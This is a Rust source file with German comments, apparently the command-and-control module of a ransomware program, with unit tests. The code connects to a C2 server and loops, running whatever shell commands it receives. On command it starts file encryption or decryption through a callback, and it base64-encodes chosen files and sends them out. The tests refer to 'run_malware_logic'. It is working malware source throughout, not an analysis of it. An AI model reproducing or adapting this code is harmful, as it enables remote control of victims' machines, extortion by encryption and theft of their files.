// Liest die Daten vom Server, beim Befehl Encrypt, wird die on_encrypt funktion aufgerufen
// Sonst werden die übergebenen Befehl ausgeführt

use crate::utils;
use anyhow::Result;
use base64::{Engine as _, engine::general_purpose};
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Output};
use std::thread;
use std::time::Duration;

/// Sendet Daten einmalig an einen entfernten Server (Fire-and-Forget).
///
/// Args:
/// - data: zu sendende Rohdaten
/// - c2_addr: Zieladresse im Format `IP:Port`
///
/// Returns:
/// - () (keine Rückgabe; Fehler werden bewusst ignoriert)
pub fn exfiltrate_data(data: &[u8], c2_addr: &str) {
    // Timout setzen, damit der Agent nicht hängt, wenn C2 down ist
    if let Ok(mut stream) = TcpStream::connect_timeout(
        &server_addr_to_socket_addr(c2_addr).unwrap_or_else(|_| "0.0.0.0:0".parse().unwrap()),
        Duration::from_secs(3),
    ) {
        let _ = stream.write_all(data);
    } else if let Ok(mut stream) = TcpStream::connect(c2_addr) {
        // Fallback: Normaler connect
        let _ = stream.write_all(data);
    }
}

/// Konvertiert eine String-Adresse in eine `SocketAddr`.
///
/// Args:
/// - addr: Adresse im Format `host:port`
///
/// Returns:
/// - Ok(SocketAddr): aufgelöste Socket-Adresse
/// - Err(anyhow::Error): Fehler bei Namensauflösung
fn server_addr_to_socket_addr(addr: &str) -> Result<std::net::SocketAddr> {
    use std::net::ToSocketAddrs;
    let mut addrs = addr.to_socket_addrs()?;
    addrs
        .next()
        .ok_or_else(|| anyhow::anyhow!("Konnte Adresse nicht auflösen"))
}

/// Führt einen Shell-Befehl aus und gibt kombinierte Ausgabe zurück.
///
/// Args:
/// - command: auszuführender Shell-Befehl
///
/// Returns:
/// - String: stdout + stderr oder Fehlermeldung
pub(crate) fn execute_shell_command(command: &str) -> String {
    let output_result: std::io::Result<Output> = if cfg!(target_os = "windows") {
        Command::new("cmd").args(["/C", command]).output()
    } else {
        Command::new("sh").arg("-c").arg(command).output()
    };

    match output_result {
        Ok(out) => {
            // stdout und stderr kombinieren wie im Python Script
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            let combined = format!("{}{}", stdout, stderr);

            // Wenn Beides leer, aber der befehl erfolgreich war
            if combined.trim().is_empty() && !out.status.success() {
                format!("Error: Command failed with exit code {}", out.status)
            } else {
                combined
            }
        }
        Err(e) => format!("Error: {}", e),
    }
}

/// Ordnet eingehende Befehle der passenden Aktion zu.
///
/// Args:
/// - command: empfangener Befehl
/// - target_dir: Basisverzeichnis für Dateioperationen
/// - on_command: Callback-Funktion zur Ausführung von Encrypt/Decrypt
///
/// Returns:
/// - String: Ergebnis der ausgeführten Aktion
pub(crate) fn process_command_logic<F>(command: &str, target_dir: &str, on_command: &F) -> String
where
    F: Fn(&str) -> Result<String>,
{
    // Logik: Encrypt Befehl oder Shell Befehl
    if command == "encrypt" {
        on_command(target_dir).unwrap_or_else(|e| format!("Error: {}", e))
    } else if let Some(path) = command.strip_prefix("encrypt ") {
        on_command(path.trim()).unwrap_or_else(|e| format!("Error: {}", e))
    } else if command == "decrypt" {
        on_command("DECRYPT_MODE").unwrap_or_else(|e| format!("Error: {}", e))
    } else if let Some(path) = command.strip_prefix("decrypt ") {
        let magic_string = format!("DECRYPT_MODE:{}", path.trim());
        on_command(&magic_string).unwrap_or_else(|e| format!("Error: {}", e))
    } else if let Some(path_str) = command.strip_prefix("exfil ") {
        let filename = path_str.trim();
        let path = utils::resolve_path(filename);

        match std::fs::read(&path) {
            Ok(content) => {
                let b64 = general_purpose::STANDARD.encode(content);
                // Dateinamen ohne Pfad
                let safe_filename = path
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("unknown_file");

                format!("EXFIL_DATA: {}:{}", safe_filename, b64)
            }
            Err(e) => format!("Error reading file for exfil: {}", e),
        }
    } else {
        // Standard Shell Befehl
        execute_shell_command(command)
    }
}

/// Baut eine Verbindung zum Server auf und verarbeitet Befehle in einer Schleife.
///
/// Args:
/// - target_dir: Arbeitsverzeichnis für Dateioperationen
/// - c2_ip: IP-Adresse des Servers
/// - c2_port: Port des Servers
/// - on_command: Callback zur Befehlsverarbeitung
///
/// Returns:
/// - () (endet nur durch Prozessabbruch)
pub fn start_c2_loop<F>(target_dir: String, c2_ip: &str, c2_port: u16, on_command: F)
where
    F: Fn(&str) -> Result<String>,
{
    let server_addr = format!("{}:{}", c2_ip, c2_port);
    let mut retries = 5; // Wie im Python Script

    println!("[*] Versuche Verbindung zum C2 Server herzustellen...");

    loop {
        match TcpStream::connect(&server_addr) {
            Ok(mut stream) => {
                println!("[*] Mit C2 Server verbunden");
                // Reset retries bei erfoglreicher Verbindung (optional)
                // retries = 5

                let mut buffer = [0u8; 4096];

                loop {
                    // Befehl empfangen
                    match stream.read(&mut buffer) {
                        Ok(0) => break, // Verbindung geschlossen
                        Ok(n) => {
                            let raw_cmd = String::from_utf8_lossy(&buffer[..n]);
                            let command = raw_cmd.trim();

                            if command.is_empty() {
                                continue;
                            }

                            let output = process_command_logic(command, &target_dir, &on_command);

                            // Ergebnis senden
                            if stream.write_all(output.as_bytes()).is_err() {
                                break;
                            }
                        }
                        Err(_) => break, // Fehler beim Lesen
                    }
                }
                println!("[*] Verbindung zum C2 Server verloren ...");
            }
            Err(e) => {
                println!("[!] Connection Fehler: {}", e);
            }
        }

        if retries > 0 {
            retries -= 1;
            thread::sleep(Duration::from_secs(5));
        } else {
            // "sys.exit(0)"
            std::process::exit(0);
        }
    }
}

// Tests
#[cfg(test)]
mod tests {
    use super::*;
    use std::net::TcpListener;

    // Simuliert run_malware_logic aus lib.rs
    fn mock_callback(input: &str) -> Result<String> {
        Ok(format!("CALLBACK_TRIGGERED: {}", input))
    }

    // Shell-Befehle testen (echo)
    #[test]
    fn test_shell_execution_basic() {
        let cmd = if cfg!(target_os = "windows") {
            "echo hello"
        } else {
            "echo hello"
        };
        let output = execute_shell_command(cmd);
        assert!(output.trim().contains("hello"), "Shell command failed");
    }

    // Fehlerhafte Shell Befehle testen
    #[test]
    fn test_shell_execution_error() {
        // Ein Befehl, der nicht existiert
        let output = execute_shell_command("befehl_gibt_es_nicht_xyz123");

        let out_lower = output.to_lowercase();

        // Prüfung erweitert um deutsche Keywords ("nicht", "gefunden")
        let is_error = out_lower.contains("error") 
            || out_lower.contains("not")    // Englisch: not found
            || out_lower.contains("nicht")  // Deutsch: nicht gefunden
            || out_lower.contains("found")  // Englisch/Deutsch Teilstring
            || out_lower.contains("befehl"); // Shell wiederholt oft den falschen Befehl

        assert!(
            is_error,
            "Error handling failed (Output was: '{}'). Expected an error message.",
            output
        );
    }

    // Test mit Standard Encrypt
    #[test]
    fn test_logic_encrypt_default() {
        let target_dir = "/default/path";
        let result = process_command_logic("encrypt", target_dir, &mock_callback);
        assert_eq!(result, "CALLBACK_TRIGGERED: /default/path");
    }

    // Test Encrypt mit Custom Path
    #[test]
    fn test_logic_encrypt_custom() {
        let target_dir = "/default/path";
        // Mit extra Leerzeichen testen (trim check)
        let result = process_command_logic("encrypt /custom/secret ", target_dir, &mock_callback);
        assert_eq!(result, "CALLBACK_TRIGGERED: /custom/secret");
    }

    // Test Decrypt Standard
    #[test]
    fn test_logic_decrypt_default() {
        let target_dir = "/default/path";
        let result = process_command_logic("decrypt", target_dir, &mock_callback);
        assert_eq!(result, "CALLBACK_TRIGGERED: DECRYPT_MODE");
    }

    // Test Decrypt mit Custom Path
    #[test]
    fn test_logic_decrypt_custom() {
        let target_dir = "/default/path";
        let result = process_command_logic("decrypt /restore/me", target_dir, &mock_callback);
        // Erwartet das interne Protokoll "DECRYPT_MODE:<PFAD>"
        assert_eq!(result, "CALLBACK_TRIGGERED: DECRYPT_MODE:/restore/me");
    }

    // Parsing testen (Shell Fallback)
    #[test]
    fn test_logic_fallback_to_shell() {
        let target_dir = "/default/path";
        let result = process_command_logic("whoami", target_dir, &mock_callback);
        // Resultat sollte nicht von Callback kommen sondern vom System
        assert!(!result.contains("CALLBACK_TRIGGERED"));
        assert!(!result.is_empty());
    }
    #[test]
    fn test_logic_exfil_parsing() {
        let target_dir = "/default/path";
        let result = process_command_logic("exfil test.txt", target_dir, &mock_callback);

        assert!(result.contains("Error reading file for exfil"));
    }

    // Exfiltrationstest
    #[test]
    fn test_exfiltration() {
        // Dummy Server starten
        let listener = TcpListener::bind("127.0.0.1:0").expect("Failed to bind listener");
        let port = listener.local_addr().unwrap().port();
        let addr_str = format!("127.0.0.1:{}", port);

        let data_to_send = b"SecretData123";

        // Sender Thread
        let addr_clone = addr_str.clone();
        let handle = thread::spawn(move || {
            // Kurz warten bis Listener bereit
            thread::sleep(Duration::from_millis(100));
            exfiltrate_data(data_to_send, &addr_clone);
        });

        // Receiver (Server)
        if let Ok((mut stream, _)) = listener.accept() {
            let mut buffer = [0u8; 1024];
            let n = stream.read(&mut buffer).expect("Failed to read");
            assert_eq!(&buffer[..n], data_to_send);
        } else {
            panic!("Mock server failed to accept");
        }

        handle.join().unwrap();
    }
}
